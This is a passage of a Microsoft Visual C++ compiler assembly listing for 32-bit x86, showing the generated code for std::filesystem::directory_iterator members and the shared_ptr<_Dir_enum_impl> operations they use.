  00021	51		 push	 ecx
  00022	68 00 00 00 00	 push	 OFFSET ??_C@_0BP@DPMCMHCK@directory_iterator?3?3operator?$CL?$CL@
  00027	e8 00 00 00 00	 call	 ?_Throw_fs_error@filesystem@std@@YAXPBDW4__std_win_error@@@Z ; std::filesystem::_Throw_fs_error
$LN2@operator:

; 2678 :             }
; 2679 : 
; 2680 :             return *this;

  0002c	8b 45 f8	 mov	 eax, DWORD PTR _this$[ebp]
$LN1@operator:

; 2681 :         }

  0002f	8b e5		 mov	 esp, ebp
  00031	5d		 pop	 ebp
  00032	c3		 ret	 0
??Edirectory_iterator@filesystem@std@@QAEAAV012@XZ ENDP	; std::filesystem::directory_iterator::operator++
_TEXT	ENDS
; Function compile flags: /Odtp
; File C:\Program Files\Microsoft Visual Studio\2022\Community\VC\Tools\MSVC\14.39.33519\include\filesystem
;	COMDAT ??Ddirectory_iterator@filesystem@std@@QBEABVdirectory_entry@12@XZ
_TEXT	SEGMENT
_this$ = -4						; size = 4
??Ddirectory_iterator@filesystem@std@@QBEABVdirectory_entry@12@XZ PROC ; std::filesystem::directory_iterator::operator*, COMDAT
; _this$ = ecx

; 2666 :         _NODISCARD const directory_entry& operator*() const noexcept /* strengthened */ {

  00000	55		 push	 ebp
  00001	8b ec		 mov	 ebp, esp
  00003	51		 push	 ecx
  00004	89 4d fc	 mov	 DWORD PTR _this$[ebp], ecx

; 2667 :             return _Impl->_Entry;

  00007	8b 4d fc	 mov	 ecx, DWORD PTR _this$[ebp]
  0000a	e8 00 00 00 00	 call	 ??$?CU_Dir_enum_impl@filesystem@std@@$0A@@?$shared_ptr@U_Dir_enum_impl@filesystem@std@@@std@@QBEPAU_Dir_enum_impl@filesystem@1@XZ ; std::shared_ptr<std::filesystem::_Dir_enum_impl>::operator-><std::filesystem::_Dir_enum_impl,0>

; 2668 :         }

  0000f	8b e5		 mov	 esp, ebp
  00011	5d		 pop	 ebp
  00012	c3		 ret	 0
??Ddirectory_iterator@filesystem@std@@QBEABVdirectory_entry@12@XZ ENDP ; std::filesystem::directory_iterator::operator*
_TEXT	ENDS
; Function compile flags: /Odtp
; File C:\Program Files\Microsoft Visual Studio\2022\Community\VC\Tools\MSVC\14.39.33519\include\filesystem
;	COMDAT ??1directory_iterator@filesystem@std@@QAE@XZ
_TEXT	SEGMENT
_this$ = -4						; size = 4
??1directory_iterator@filesystem@std@@QAE@XZ PROC	; std::filesystem::directory_iterator::~directory_iterator, COMDAT
; _this$ = ecx

; 2661 :         ~directory_iterator() noexcept                         = default;

  00000	55		 push	 ebp
  00001	8b ec		 mov	 ebp, esp
  00003	51		 push	 ecx
  00004	89 4d fc	 mov	 DWORD PTR _this$[ebp], ecx
  00007	8b 4d fc	 mov	 ecx, DWORD PTR _this$[ebp]
  0000a	e8 00 00 00 00	 call	 ??1?$shared_ptr@U_Dir_enum_impl@filesystem@std@@@std@@QAE@XZ ; std::shared_ptr<std::filesystem::_Dir_enum_impl>::~shared_ptr<std::filesystem::_Dir_enum_impl>
  0000f	8b e5		 mov	 esp, ebp
  00011	5d		 pop	 ebp
  00012	c3		 ret	 0
??1directory_iterator@filesystem@std@@QAE@XZ ENDP	; std::filesystem::directory_iterator::~directory_iterator
_TEXT	ENDS
; Function compile flags: /Odtp
; File C:\Program Files\Microsoft Visual Studio\2022\Community\VC\Tools\MSVC\14.39.33519\include\filesystem
;	COMDAT ??0directory_iterator@filesystem@std@@QAE@$$QAV012@@Z
_TEXT	SEGMENT
tv70 = -8						; size = 4
_this$ = -4						; size = 4
___that$ = 8						; size = 4
??0directory_iterator@filesystem@std@@QAE@$$QAV012@@Z PROC ; std::filesystem::directory_iterator::directory_iterator, COMDAT
; _this$ = ecx

; 2660 :         directory_iterator(directory_iterator&&) noexcept      = default;

  00000	55		 push	 ebp
  00001	8b ec		 mov	 ebp, esp
  00003	83 ec 08	 sub	 esp, 8
  00006	89 4d fc	 mov	 DWORD PTR _this$[ebp], ecx
  00009	8b 45 fc	 mov	 eax, DWORD PTR _this$[ebp]
  0000c	89 45 f8	 mov	 DWORD PTR tv70[ebp], eax
  0000f	8b 4d 08	 mov	 ecx, DWORD PTR ___that$[ebp]
  00012	51		 push	 ecx
  00013	8b 4d f8	 mov	 ecx, DWORD PTR tv70[ebp]
  00016	e8 00 00 00 00	 call	 ??0?$shared_ptr@U_Dir_enum_impl@filesystem@std@@@std@@QAE@$$QAV01@@Z ; std::shared_ptr<std::filesystem::_Dir_enum_impl>::shared_ptr<std::filesystem::_Dir_enum_impl>
  0001b	8b 45 fc	 mov	 eax, DWORD PTR _this$[ebp]
  0001e	8b e5		 mov	 esp, ebp
  00020	5d		 pop	 ebp
  00021	c2 04 00	 ret	 4
??0directory_iterator@filesystem@std@@QAE@$$QAV012@@Z ENDP ; std::filesystem::directory_iterator::directory_iterator
_TEXT	ENDS
; Function compile flags: /Odtp
; File C:\Program Files\Microsoft Visual Studio\2022\Community\VC\Tools\MSVC\14.39.33519\include\filesystem
;	COMDAT ??0directory_iterator@filesystem@std@@QAE@ABV012@@Z
_TEXT	SEGMENT
tv70 = -8						; size = 4
_this$ = -4						; size = 4
___that$ = 8						; size = 4
??0directory_iterator@filesystem@std@@QAE@ABV012@@Z PROC ; std::filesystem::directory_iterator::directory_iterator, COMDAT
; _this$ = ecx

; 2659 :         directory_iterator(const directory_iterator&) noexcept = default; // strengthened

  00000	55		 push	 ebp
  00001	8b ec		 mov	 ebp, esp
  00003	83 ec 08	 sub	 esp, 8
  00006	89 4d fc	 mov	 DWORD PTR _this$[ebp], ecx
  00009	8b 45 fc	 mov	 eax, DWORD PTR _this$[ebp]
  0000c	89 45 f8	 mov	 DWORD PTR tv70[ebp], eax
  0000f	8b 4d 08	 mov	 ecx, DWORD PTR ___that$[ebp]
  00012	51		 push	 ecx
  00013	8b 4d f8	 mov	 ecx, DWORD PTR tv70[ebp]
  00016	e8 00 00 00 00	 call	 ??0?$shared_ptr@U_Dir_enum_impl@filesystem@std@@@std@@QAE@ABV01@@Z ; std::shared_ptr<std::filesystem::_Dir_enum_impl>::shared_ptr<std::filesystem::_Dir_enum_impl>
  0001b	8b 45 fc	 mov	 eax, DWORD PTR _this$[ebp]
  0001e	8b e5		 mov	 esp, ebp
  00020	5d		 pop	 ebp
  00021	c2 04 00	 ret	 4
??0directory_iterator@filesystem@std@@QAE@ABV012@@Z ENDP ; std::filesystem::directory_iterator::directory_iterator
_TEXT	ENDS
; Function compile flags: /Odtp
; File C:\Program Files\Microsoft Visual Studio\2022\Community\VC\Tools\MSVC\14.39.33519\include\filesystem
;	COMDAT ??0directory_iterator@filesystem@std@@QAE@ABVpath@12@@Z
_TEXT	SEGMENT
__Error$ = -8						; size = 4
_this$ = -4						; size = 4
__Path$ = 8						; size = 4
??0directory_iterator@filesystem@std@@QAE@ABVpath@12@@Z PROC ; std::filesystem::directory_iterator::directory_iterator, COMDAT
; _this$ = ecx

; 2637 :         explicit directory_iterator(const path& _Path) {

  00000	55		 push	 ebp
  00001	8b ec		 mov	 ebp, esp
  00003	83 ec 08	 sub	 esp, 8
  00006	89 4d fc	 mov	 DWORD PTR _this$[ebp], ecx
  00009	8b 4d fc	 mov	 ecx, DWORD PTR _this$[ebp]
  0000c	e8 00 00 00 00	 call	 ??0?$shared_ptr@U_Dir_enum_impl@filesystem@std@@@std@@QAE@XZ ; std::shared_ptr<std::filesystem::_Dir_enum_impl>::shared_ptr<std::filesystem::_Dir_enum_impl>

; 2638 :             const auto _Error = _Dir_enum_impl::_Initialize_dir_enum(_Impl, _Path);

  00011	6a 00		 push	 0
  00013	8b 45 08	 mov	 eax, DWORD PTR __Path$[ebp]
  00016	50		 push	 eax
  00017	8b 4d fc	 mov	 ecx, DWORD PTR _this$[ebp]
  0001a	51		 push	 ecx
  0001b	e8 00 00 00 00	 call	 ??$_Initialize_dir_enum@U_Dir_enum_impl@filesystem@std@@@_Dir_enum_impl@filesystem@std@@SA?AW4__std_win_error@@AAV?$shared_ptr@U_Dir_enum_impl@filesystem@std@@@2@ABVpath@12@W4directory_options@12@@Z ; std::filesystem::_Dir_enum_impl::_Initialize_dir_enum<std::filesystem::_Dir_enum_impl>
  00020	83 c4 0c	 add	 esp, 12			; 0000000cH
  00023	89 45 f8	 mov	 DWORD PTR __Error$[ebp], eax

; 2639 :             if (_Error != __std_win_error::_Success) {

  00026	83 7d f8 00	 cmp	 DWORD PTR __Error$[ebp], 0
  0002a	74 12		 je	 SHORT $LN2@directory_

; 2640 :                 _Throw_fs_error("directory_iterator::directory_iterator", _Error, _Path);

  0002c	8b 55 08	 mov	 edx, DWORD PTR __Path$[ebp]
  0002f	52		 push	 edx
  00030	8b 45 f8	 mov	 eax, DWORD PTR __Error$[ebp]
  00033	50		 push	 eax
  00034	68 00 00 00 00	 push	 OFFSET ??_C@_0CH@GANCNKKD@directory_iterator?3?3directory_i@
  00039	e8 00 00 00 00	 call	 ?_Throw_fs_error@filesystem@std@@YAXPBDW4__std_win_error@@ABVpath@12@@Z ; std::filesystem::_Throw_fs_error
$LN2@directory_:

; 2641 :             }
; 2642 :         }

  0003e	8b 45 fc	 mov	 eax, DWORD PTR _this$[ebp]
$LN3@directory_:
  00041	8b e5		 mov	 esp, ebp
  00043	5d		 pop	 ebp
  00044	c2 04 00	 ret	 4
??0directory_iterator@filesystem@std@@QAE@ABVpath@12@@Z ENDP ; std::filesystem::directory_iterator::directory_iterator
_TEXT	ENDS
; Function compile flags: /Odtp
; File C:\Program Files\Microsoft Visual Studio\2022\Community\VC\Tools\MSVC\14.39.33519\include\filesystem
;	COMDAT ??0directory_iterator@filesystem@std@@QAE@XZ
_TEXT	SEGMENT
_this$ = -4						; size = 4
??0directory_iterator@filesystem@std@@QAE@XZ PROC	; std::filesystem::directory_iterator::directory_iterator, COMDAT
; _this$ = ecx

; 2636 :         directory_iterator() noexcept = default;

  00000	55		 push	 ebp
  00001	8b ec		 mov	 ebp, esp
  00003	51		 push	 ecx
  00004	89 4d fc	 mov	 DWORD PTR _this$[ebp], ecx
  00007	8b 4d fc	 mov	 ecx, DWORD PTR _this$[ebp]
  0000a	e8 00 00 00 00	 call	 ??0?$shared_ptr@U_Dir_enum_impl@filesystem@std@@@std@@QAE@XZ ; std::shared_ptr<std::filesystem::_Dir_enum_impl>::shared_ptr<std::filesystem::_Dir_enum_impl>
  0000f	8b 45 fc	 mov	 eax, DWORD PTR _this$[ebp]
  00012	8b e5		 mov	 esp, ebp
  00014	5d		 pop	 ebp
  00015	c3		 ret	 0
??0directory_iterator@filesystem@std@@QAE@XZ ENDP	; std::filesystem::directory_iterator::directory_iterator
_TEXT	ENDS
; Function compile flags: /Odtp
; File C:\Program Files\Microsoft Visual Studio\2022\Community\VC\Tools\MSVC\14.39.33519\include\type_traits
;	COMDAT ??$move@AAVpath@filesystem@std@@@std@@YA$$QAVpath@filesystem@0@AAV120@@Z
_TEXT	SEGMENT
__Arg$ = 8						; size = 4
??$move@AAVpath@filesystem@std@@@std@@YA$$QAVpath@filesystem@0@AAV120@@Z PROC ; std::move<std::filesystem::path &>, COMDAT

; 1571 : _NODISCARD _MSVC_INTRINSIC constexpr remove_reference_t<_Ty>&& move(_Ty&& _Arg) noexcept {

  00000	55		 push	 ebp
  00001	8b ec		 mov	 ebp, esp

; 1572 :     return static_cast<remove_reference_t<_Ty>&&>(_Arg);

  00003	8b 45 08	 mov	 eax, DWORD PTR __Arg$[ebp]

; 1573 : }

  00006	5d		 pop	 ebp
  00007	c3		 ret	 0
??$move@AAVpath@filesystem@std@@@std@@YA$$QAVpath@filesystem@0@AAV120@@Z ENDP ; std::move<std::filesystem::path &>
_TEXT	ENDS
; Function compile flags: /Odtp
; File C:\Program Files\Microsoft Visual Studio\2022\Community\VC\Tools\MSVC\14.39.33519\include\type_traits
;	COMDAT ??$move@AAU_Find_file_handle@filesystem@std@@@std@@YA$$QAU_Find_file_handle@filesystem@0@AAU120@@Z
_TEXT	SEGMENT
__Arg$ = 8						; size = 4
??$move@AAU_Find_file_handle@filesystem@std@@@std@@YA$$QAU_Find_file_handle@filesystem@0@AAU120@@Z PROC ; std::move<std::filesystem::_Find_file_handle &>, COMDAT

; 1571 : _NODISCARD _MSVC_INTRINSIC constexpr remove_reference_t<_Ty>&& move(_Ty&& _Arg) noexcept {

  00000	55		 push	 ebp
  00001	8b ec		 mov	 ebp, esp

; 1572 :     return static_cast<remove_reference_t<_Ty>&&>(_Arg);

  00003	8b 45 08	 mov	 eax, DWORD PTR __Arg$[ebp]

; 1573 : }

  00006	5d		 pop	 ebp
  00007	c3		 ret	 0
??$move@AAU_Find_file_handle@filesystem@std@@@std@@YA$$QAU_Find_file_handle@filesystem@0@AAU120@@Z ENDP ; std::move<std::filesystem::_Find_file_handle &>
_TEXT	ENDS
; Function compile flags: /Odtp
; File C:\Program Files\Microsoft Visual Studio\2022\Community\VC\Tools\MSVC\14.39.33519\include\type_traits
;	COMDAT ??$_Bitmask_includes_any@W4directory_options@filesystem@std@@@std@@YA_NW4directory_options@filesystem@0@0@Z
_TEXT	SEGMENT
tv68 = -4						; size = 4
__Left$ = 8						; size = 4
__Elements$ = 12					; size = 4
??$_Bitmask_includes_any@W4directory_options@filesystem@std@@@std@@YA_NW4directory_options@filesystem@0@0@Z PROC ; std::_Bitmask_includes_any<enum std::filesystem::directory_options>, COMDAT

; 2298 : _NODISCARD constexpr bool _Bitmask_includes_any(_Bitmask _Left, _Bitmask _Elements) noexcept {

  00000	55		 push	 ebp
  00001	8b ec		 mov	 ebp, esp
  00003	51		 push	 ecx

; 2299 :     return (_Left & _Elements) != _Bitmask{};

  00004	8b 45 0c	 mov	 eax, DWORD PTR __Elements$[ebp]
  00007	50		 push	 eax
  00008	8b 4d 08	 mov	 ecx, DWORD PTR __Left$[ebp]
  0000b	51		 push	 ecx
  0000c	e8 00 00 00 00	 call	 ??Ifilesystem@std@@YA?AW4directory_options@01@W4201@0@Z ; std::filesystem::operator&
  00011	83 c4 08	 add	 esp, 8
  00014	85 c0		 test	 eax, eax
  00016	74 09		 je	 SHORT $LN3@Bitmask_in
  00018	c7 45 fc 01 00
	00 00		 mov	 DWORD PTR tv68[ebp], 1
  0001f	eb 07		 jmp	 SHORT $LN4@Bitmask_in
$LN3@Bitmask_in:
  00021	c7 45 fc 00 00
	00 00		 mov	 DWORD PTR tv68[ebp], 0
$LN4@Bitmask_in:
  00028	0f b6 45 fc	 movzx	 eax, BYTE PTR tv68[ebp]

; 2300 : }

  0002c	8b e5		 mov	 esp, ebp
  0002e	5d		 pop	 ebp
  0002f	c3		 ret	 0
??$_Bitmask_includes_any@W4directory_options@filesystem@std@@@std@@YA_NW4directory_options@filesystem@0@0@Z ENDP ; std::_Bitmask_includes_any<enum std::filesystem::directory_options>
_TEXT	ENDS
; Function compile flags: /Odtp
; File C:\Program Files\Microsoft Visual Studio\2022\Community\VC\Tools\MSVC\14.39.33519\include\memory
;	COMDAT ??$?DU_Dir_enum_impl@filesystem@std@@$0A@@?$shared_ptr@U_Dir_enum_impl@filesystem@std@@@std@@QBEAAU_Dir_enum_impl@filesystem@1@XZ
_TEXT	SEGMENT
_this$ = -4						; size = 4
??$?DU_Dir_enum_impl@filesystem@std@@$0A@@?$shared_ptr@U_Dir_enum_impl@filesystem@std@@@std@@QBEAAU_Dir_enum_impl@filesystem@1@XZ PROC ; std::shared_ptr<std::filesystem::_Dir_enum_impl>::operator*<std::filesystem::_Dir_enum_impl,0>, COMDAT
; _this$ = ecx

; 1727 :     _NODISCARD _Ty2& operator*() const noexcept {

  00000	55		 push	 ebp
  00001	8b ec		 mov	 ebp, esp
  00003	51		 push	 ecx
  00004	89 4d fc	 mov	 DWORD PTR _this$[ebp], ecx

; 1728 :         return *get();

  00007	8b 4d fc	 mov	 ecx, DWORD PTR _this$[ebp]
  0000a	e8 00 00 00 00	 call	 ?get@?$_Ptr_base@U_Dir_enum_impl@filesystem@std@@@std@@IBEPAU_Dir_enum_impl@filesystem@2@XZ ; std::_Ptr_base<std::filesystem::_Dir_enum_impl>::get

; 1729 :     }

  0000f	8b e5		 mov	 esp, ebp
  00011	5d		 pop	 ebp
  00012	c3		 ret	 0
??$?DU_Dir_enum_impl@filesystem@std@@$0A@@?$shared_ptr@U_Dir_enum_impl@filesystem@std@@@std@@QBEAAU_Dir_enum_impl@filesystem@1@XZ ENDP ; std::shared_ptr<std::filesystem::_Dir_enum_impl>::operator*<std::filesystem::_Dir_enum_impl,0>
_TEXT	ENDS
; Function compile flags: /Odtp
; File C:\Program Files\Microsoft Visual Studio\2022\Community\VC\Tools\MSVC\14.39.33519\include\memory
;	COMDAT ?reset@?$shared_ptr@U_Dir_enum_impl@filesystem@std@@@std@@QAEXXZ
_TEXT	SEGMENT
$T1 = -16						; size = 8
tv74 = -8						; size = 4
_this$ = -4						; size = 4
?reset@?$shared_ptr@U_Dir_enum_impl@filesystem@std@@@std@@QAEXXZ PROC ; std::shared_ptr<std::filesystem::_Dir_enum_impl>::reset, COMDAT
; _this$ = ecx

; 1696 :     void reset() noexcept { // release resource and convert to empty shared_ptr object

  00000	55		 push	 ebp
  00001	8b ec		 mov	 ebp, esp
  00003	83 ec 10	 sub	 esp, 16			; 00000010H
  00006	89 4d fc	 mov	 DWORD PTR _this$[ebp], ecx

; 1697 :         shared_ptr().swap(*this);

  00009	33 c0		 xor	 eax, eax
  0000b	89 45 f0	 mov	 DWORD PTR $T1[ebp], eax
  0000e	89 45 f4	 mov	 DWORD PTR $T1[ebp+4], eax
  00011	8d 4d f0	 lea	 ecx, DWORD PTR $T1[ebp]
  00014	e8 00 00 00 00	 call	 ??0?$shared_ptr@U_Dir_enum_impl@filesystem@std@@@std@@QAE@XZ ; std::shared_ptr<std::filesystem::_Dir_enum_impl>::shared_ptr<std::filesystem::_Dir_enum_impl>
  00019	89 45 f8	 mov	 DWORD PTR tv74[ebp], eax
  0001c	8b 4d fc	 mov	 ecx, DWORD PTR _this$[ebp]
  0001f	51		 push	 ecx
  00020	8b 4d f8	 mov	 ecx, DWORD PTR tv74[ebp]
  00023	e8 00 00 00 00	 call	 ?swap@?$shared_ptr@U_Dir_enum_impl@filesystem@std@@@std@@QAEXAAV12@@Z ; std::shared_ptr<std::filesystem::_Dir_enum_impl>::swap
  00028	8d 4d f0	 lea	 ecx, DWORD PTR $T1[ebp]
  0002b	e8 00 00 00 00	 call	 ??1?$shared_ptr@U_Dir_enum_impl@filesystem@std@@@std@@QAE@XZ ; std::shared_ptr<std::filesystem::_Dir_enum_impl>::~shared_ptr<std::filesystem::_Dir_enum_impl>

; 1698 :     }

  00030	8b e5		 mov	 esp, ebp
  00032	5d		 pop	 ebp
  00033	c3		 ret	 0
?reset@?$shared_ptr@U_Dir_enum_impl@filesystem@std@@@std@@QAEXXZ ENDP ; std::shared_ptr<std::filesystem::_Dir_enum_impl>::reset
_TEXT	ENDS
; Function compile flags: /Odtp
; File C:\Program Files\Microsoft Visual Studio\2022\Community\VC\Tools\MSVC\14.39.33519\include\memory
;	COMDAT ?swap@?$shared_ptr@U_Dir_enum_impl@filesystem@std@@@std@@QAEXAAV12@@Z
_TEXT	SEGMENT
_this$ = -4						; size = 4
__Other$ = 8						; size = 4
?swap@?$shared_ptr@U_Dir_enum_impl@filesystem@std@@@std@@QAEXAAV12@@Z PROC ; std::shared_ptr<std::filesystem::_Dir_enum_impl>::swap, COMDAT
; _this$ = ecx

; 1692 :     void swap(shared_ptr& _Other) noexcept {

  00000	55		 push	 ebp
  00001	8b ec		 mov	 ebp, esp
  00003	51		 push	 ecx
  00004	89 4d fc	 mov	 DWORD PTR _this$[ebp], ecx

; 1693 :         this->_Swap(_Other);

  00007	8b 45 08	 mov	 eax, DWORD PTR __Other$[ebp]
  0000a	50		 push	 eax
  0000b	8b 4d fc	 mov	 ecx, DWORD PTR _this$[ebp]
  0000e	e8 00 00 00 00	 call	 ?_Swap@?$_Ptr_base@U_Dir_enum_impl@filesystem@std@@@std@@IAEXAAV12@@Z ; std::_Ptr_base<std::filesystem::_Dir_enum_impl>::_Swap

; 1694 :     }

  00013	8b e5		 mov	 esp, ebp
  00015	5d		 pop	 ebp
  00016	c2 04 00	 ret	 4
?swap@?$shared_ptr@U_Dir_enum_impl@filesystem@std@@@std@@QAEXAAV12@@Z ENDP ; std::shared_ptr<std::filesystem::_Dir_enum_impl>::swap
_TEXT	ENDS
; Function compile flags: /Odtp
; File C:\Program Files\Microsoft Visual Studio\2022\Community\VC\Tools\MSVC\14.39.33519\include\memory
;	COMDAT ??4?$shared_ptr@U_Dir_enum_impl@filesystem@std@@@std@@QAEAAV01@$$QAV01@@Z
_TEXT	SEGMENT
$T1 = -16						; size = 8
tv74 = -8						; size = 4
_this$ = -4						; size = 4
__Right$ = 8						; size = 4
??4?$shared_ptr@U_Dir_enum_impl@filesystem@std@@@std@@QAEAAV01@$$QAV01@@Z PROC ; std::shared_ptr<std::filesystem::_Dir_enum_impl>::operator=, COMDAT
; _this$ = ecx

; 1664 :     shared_ptr& operator=(shared_ptr&& _Right) noexcept { // take resource from _Right

  00000	55		 push	 ebp
  00001	8b ec		 mov	 ebp, esp
  00003	83 ec 10	 sub	 esp, 16			; 00000010H
  00006	89 4d fc	 mov	 DWORD PTR _this$[ebp], ecx

; 1665 :         shared_ptr(_STD move(_Right)).swap(*this);

  00009	8b 45 08	 mov	 eax, DWORD PTR __Right$[ebp]
  0000c	50		 push	 eax
  0000d	e8 00 00 00 00	 call	 ??$move@AAV?$shared_ptr@U_Dir_enum_impl@filesystem@std@@@std@@@std@@YA$$QAV?$shared_ptr@U_Dir_enum_impl@filesystem@std@@@0@AAV10@@Z ; std::move<std::shared_ptr<std::filesystem::_Dir_enum_impl> &>
  00012	83 c4 04	 add	 esp, 4
  00015	50		 push	 eax
  00016	8d 4d f0	 lea	 ecx, DWORD PTR $T1[ebp]
  00019	e8 00 00 00 00	 call	 ??0?$shared_ptr@U_Dir_enum_impl@filesystem@std@@@std@@QAE@$$QAV01@@Z ; std::shared_ptr<std::filesystem::_Dir_enum_impl>::shared_ptr<std::filesystem::_Dir_enum_impl>
  0001e	89 45 f8	 mov	 DWORD PTR tv74[ebp], eax
  00021	8b 4d fc	 mov	 ecx, DWORD PTR _this$[ebp]
  00024	51		 push	 ecx
  00025	8b 4d f8	 mov	 ecx, DWORD PTR tv74[ebp]
  00028	e8 00 00 00 00	 call	 ?swap@?$shared_ptr@U_Dir_enum_impl@filesystem@std@@@std@@QAEXAAV12@@Z ; std::shared_ptr<std::filesystem::_Dir_enum_impl>::swap
  0002d	8d 4d f0	 lea	 ecx, DWORD PTR $T1[ebp]
  00030	e8 00 00 00 00	 call	 ??1?$shared_ptr@U_Dir_enum_impl@filesystem@std@@@std@@QAE@XZ ; std::shared_ptr<std::filesystem::_Dir_enum_impl>::~shared_ptr<std::filesystem::_Dir_enum_impl>

; 1666 :         return *this;

  00035	8b 45 fc	 mov	 eax, DWORD PTR _this$[ebp]

; 1667 :     }

  00038	8b e5		 mov	 esp, ebp
  0003a	5d		 pop	 ebp
  0003b	c2 04 00	 ret	 4
??4?$shared_ptr@U_Dir_enum_impl@filesystem@std@@@std@@QAEAAV01@$$QAV01@@Z ENDP ; std::shared_ptr<std::filesystem::_Dir_enum_impl>::operator=
_TEXT	ENDS
; Function compile flags: /Odtp
; File C:\Program Files\Microsoft Visual Studio\2022\Community\VC\Tools\MSVC\14.39.33519\include\memory
;	COMDAT ??1?$shared_ptr@U_Dir_enum_impl@filesystem@std@@@std@@QAE@XZ
_TEXT	SEGMENT
_this$ = -4						; size = 4
??1?$shared_ptr@U_Dir_enum_impl@filesystem@std@@@std@@QAE@XZ PROC ; std::shared_ptr<std::filesystem::_Dir_enum_impl>::~shared_ptr<std::filesystem::_Dir_enum_impl>, COMDAT
; _this$ = ecx

; 1649 :     ~shared_ptr() noexcept { // release resource

  00000	55		 push	 ebp
  00001	8b ec		 mov	 ebp, esp
  00003	51		 push	 ecx
  00004	89 4d fc	 mov	 DWORD PTR _this$[ebp], ecx

; 1650 :         this->_Decref();

  00007	8b 4d fc	 mov	 ecx, DWORD PTR _this$[ebp]
  0000a	e8 00 00 00 00	 call	 ?_Decref@?$_Ptr_base@U_Dir_enum_impl@filesystem@std@@@std@@IAEXXZ ; std::_Ptr_base<std::filesystem::_Dir_enum_impl>::_Decref

; 1651 :     }

  0000f	8b e5		 mov	 esp, ebp
  00011	5d		 pop	 ebp
  00012	c3		 ret	 0
??1?$shared_ptr@U_Dir_enum_impl@filesystem@std@@@std@@QAE@XZ ENDP ; std::shared_ptr<std::filesystem::_Dir_enum_impl>::~shared_ptr<std::filesystem::_Dir_enum_impl>
_TEXT	ENDS
; Function compile flags: /Odtp
; File C:\Program Files\Microsoft Visual Studio\2022\Community\VC\Tools\MSVC\14.39.33519\include\memory
;	COMDAT ??0?$shared_ptr@U_Dir_enum_impl@filesystem@std@@@std@@QAE@$$QAV01@@Z
_TEXT	SEGMENT
_this$ = -4						; size = 4
__Right$ = 8						; size = 4
??0?$shared_ptr@U_Dir_enum_impl@filesystem@std@@@std@@QAE@$$QAV01@@Z PROC ; std::shared_ptr<std::filesystem::_Dir_enum_impl>::shared_ptr<std::filesystem::_Dir_enum_impl>, COMDAT
; _this$ = ecx

; 1604 :     shared_ptr(shared_ptr&& _Right) noexcept { // construct shared_ptr object that takes resource from _Right

  00000	55		 push	 ebp
  00001	8b ec		 mov	 ebp, esp
  00003	51		 push	 ecx
  00004	89 4d fc	 mov	 DWORD PTR _this$[ebp], ecx
  00007	8b 4d fc	 mov	 ecx, DWORD PTR _this$[ebp]
  0000a	e8 00 00 00 00	 call	 ??0?$_Ptr_base@U_Dir_enum_impl@filesystem@std@@@std@@IAE@XZ ; std::_Ptr_base<std::filesystem::_Dir_enum_impl>::_Ptr_base<std::filesystem::_Dir_enum_impl>

; 1605 :         this->_Move_construct_from(_STD move(_Right));

  0000f	8b 45 08	 mov	 eax, DWORD PTR __Right$[ebp]
  00012	50		 push	 eax
  00013	e8 00 00 00 00	 call	 ??$move@AAV?$shared_ptr@U_Dir_enum_impl@filesystem@std@@@std@@@std@@YA$$QAV?$shared_ptr@U_Dir_enum_impl@filesystem@std@@@0@AAV10@@Z ; std::move<std::shared_ptr<std::filesystem::_Dir_enum_impl> &>
  00018	83 c4 04	 add	 esp, 4
  0001b	50		 push	 eax
  0001c	8b 4d fc	 mov	 ecx, DWORD PTR _this$[ebp]
  0001f	e8 00 00 00 00	 call	 ??$_Move_construct_from@U_Dir_enum_impl@filesystem@std@@@?$_Ptr_base@U_Dir_enum_impl@filesystem@std@@@std@@IAEX$$QAV01@@Z ; std::_Ptr_base<std::filesystem::_Dir_enum_impl>::_Move_construct_from<std::filesystem::_Dir_enum_impl>

; 1606 :     }

  00024	8b 45 fc	 mov	 eax, DWORD PTR _this$[ebp]
  00027	8b e5		 mov	 esp, ebp
  00029	5d		 pop	 ebp
  0002a	c2 04 00	 ret	 4
??0?$shared_ptr@U_Dir_enum_impl@filesystem@std@@@std@@QAE@$$QAV01@@Z ENDP ; std::shared_ptr<std::filesystem::_Dir_enum_impl>::shared_ptr<std::filesystem::_Dir_enum_impl>
_TEXT	ENDS
; Function compile flags: /Odtp
; File C:\Program Files\Microsoft Visual Studio\2022\Community\VC\Tools\MSVC\14.39.33519\include\memory
;	COMDAT ??0?$shared_ptr@U_Dir_enum_impl@filesystem@std@@@std@@QAE@ABV01@@Z
_TEXT	SEGMENT
_this$ = -4						; size = 4
__Other$ = 8						; size = 4
??0?$shared_ptr@U_Dir_enum_impl@filesystem@std@@@std@@QAE@ABV01@@Z PROC ; std::shared_ptr<std::filesystem::_Dir_enum_impl>::shared_ptr<std::filesystem::_Dir_enum_impl>, COMDAT
; _this$ = ecx

; 1594 :     shared_ptr(const shared_ptr& _Other) noexcept { // construct shared_ptr object that owns same resource as _Other

  00000	55		 push	 ebp
  00001	8b ec		 mov	 ebp, esp
  00003	51		 push	 ecx
  00004	89 4d fc	 mov	 DWORD PTR _this$[ebp], ecx
  00007	8b 4d fc	 mov	 ecx, DWORD PTR _this$[ebp]
  0000a	e8 00 00 00 00	 call	 ??0?$_Ptr_base@U_Dir_enum_impl@filesystem@std@@@std@@IAE@XZ ; std::_Ptr_base<std::filesystem::_Dir_enum_impl>::_Ptr_base<std::filesystem::_Dir_enum_impl>

; 1595 :         this->_Copy_construct_from(_Other);

  0000f	8b 45 08	 mov	 eax, DWORD PTR __Other$[ebp]
  00012	50		 push	 eax
  00013	8b 4d fc	 mov	 ecx, DWORD PTR _this$[ebp]
  00016	e8 00 00 00 00	 call	 ??$_Copy_construct_from@U_Dir_enum_impl@filesystem@std@@@?$_Ptr_base@U_Dir_enum_impl@filesystem@std@@@std@@IAEXABV?$shared_ptr@U_Dir_enum_impl@filesystem@std@@@1@@Z ; std::_Ptr_base<std::filesystem::_Dir_enum_impl>::_Copy_construct_from<std::filesystem::_Dir_enum_impl>

; 1596 :     }

  0001b	8b 45 fc	 mov	 eax, DWORD PTR _this$[ebp]
  0001e	8b e5		 mov	 esp, ebp
  00020	5d		 pop	 ebp
  00021	c2 04 00	 ret	 4
??0?$shared_ptr@U_Dir_enum_impl@filesystem@std@@@std@@QAE@ABV01@@Z ENDP ; std::shared_ptr<std::filesystem::_Dir_enum_impl>::shared_ptr<std::filesystem::_Dir_enum_impl>
_TEXT	ENDS
; Function compile flags: /Odtp
; File C:\Program Files\Microsoft Visual Studio\2022\Community\VC\Tools\MSVC\14.39.33519\include\memory
;	COMDAT ??0?$shared_ptr@U_Dir_enum_impl@filesystem@std@@@std@@QAE@XZ
_TEXT	SEGMENT
_this$ = -4						; size = 4
